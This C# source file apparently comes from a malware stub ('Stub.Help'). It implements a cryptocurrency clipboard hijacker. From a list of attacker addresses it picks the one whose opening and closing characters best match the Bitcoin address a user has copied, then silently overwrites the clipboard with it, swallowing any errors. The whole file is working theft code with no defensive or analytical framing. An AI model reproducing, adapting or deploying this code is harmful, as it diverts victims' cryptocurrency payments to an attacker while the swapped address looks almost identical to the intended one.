using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace Stub.Help
{
    class SetClipBoard
    {
        public static string setwallet = "";
        internal static void Run(string origTxt, string[] lst)
        {
            try
            {
                var originalbtc = origTxt.Trim();
                var selection = new HashSet<string>();
                var mFCFit = 0;
                foreach (var a in lst.ToList())
                {
                    var actFirstCharFit = FirtNum(a, originalbtc);

                    if (actFirstCharFit < mFCFit)
                    {
                    }
                    else if (actFirstCharFit == mFCFit)
                    {
                        selection.Add(a);
                    }
                    else if (actFirstCharFit > mFCFit)
                    {
                        selection.Clear();
                        mFCFit = actFirstCharFit;
                        selection.Add(a);
                        Clipboard.SetText(a);
                        setwallet = a;
                    }
                }
                var maxLastCharFit = 0;
                foreach (var a in selection)
                {
                    var actLastCharFit = LastCharFitNum(a, originalbtc);

                    if (actLastCharFit <= maxLastCharFit)
                    {

                    }
                    else
                    {
                        maxLastCharFit = actLastCharFit;
                        Clipboard.SetText(a);
                    }
                }
            }
            catch
            {
            }
        }
        private static int LastCharFitNum(string a, string b)
        {
            var cnt = 0;
            var match = true;
            for (var i = 0; i < Math.Min(a.Length, b.Length) && match; i++)
            {
                if (a[a.Length - 1 - i] != b[b.Length - 1 - i])
                    match = false;
                else
                    cnt++;
            }
            return cnt;
        }

        private static int FirtNum(string a, string b)
        {
            var cnt = 0;
            var match = true;
            for (var i = 0; i < Math.Min(a.Length, b.Length) && match; i++)
            {
                if (a[i] != b[i])
                    match = false;
                else
                    cnt++;
            }
            return cnt;
        }
    }
}
